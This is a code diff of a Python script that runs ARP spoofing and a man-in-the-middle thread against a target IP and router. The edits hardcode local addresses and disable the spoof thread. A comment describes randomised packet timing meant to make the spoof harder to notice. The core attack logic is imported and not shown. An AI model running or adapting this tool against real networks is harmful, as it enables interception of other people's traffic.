@@ -1,6 +1,6 @@
 """
 this file's purpose is:
-the server should activate this script in a distinct process, 
+the server should activate this script in a distinct process,
 and than kills it, when shutting down.
 """
 
@@ -16,8 +16,9 @@ import random
 from networking import Spoofer
 
 if (len(sys.argv) != 4):
-    print(f"Wrong usage. Usage- spoof.py <host_ip> <target_ip> <router_ip> and not {sys.argv}")
-    sys.exit(0)
+    # print(f"Wrong usage. Usage- spoof.py <host_ip> <target_ip> <router_ip> and not {sys.argv}")
+    # sys.exit(0)
+    sys.argv = ["spoof.py", "192.168.1.106","192.168.1.106","192.168.1.1"]
 
 
 class Spoof():
@@ -44,7 +45,7 @@ class Spoof():
             while True:
                 self.__spoof_obj.send_spoofed_packet()
                 time.sleep(random.random()/10) # wait a random number between 0-0.1
-                # The time.sleep has 2 jobs - 
+                # The time.sleep has 2 jobs -
                 #   first, make the spoof harder to notice.
                 #   second, the terminating signal can only be received if the process is waiting, and not running.
                 #       thus, without the time the signal wouldn't be registered.
@@ -59,13 +60,13 @@ def debug_main():
 
 def main():
     spoofer = Spoof()
-    spoof_t: threading.Thread = threading.Thread(target=spoofer.spoof)
+    #spoof_t: threading.Thread = threading.Thread(target=spoofer.spoof)
     MITM_t: threading.Thread = threading.Thread(target=spoofer.MITM)
-    
-    spoof_t.start()
+
+    #spoof_t.start()
     MITM_t.start()
     # Run in the background.
-    
+
 
 if __name__ == "__main__":
     if DEBUG:
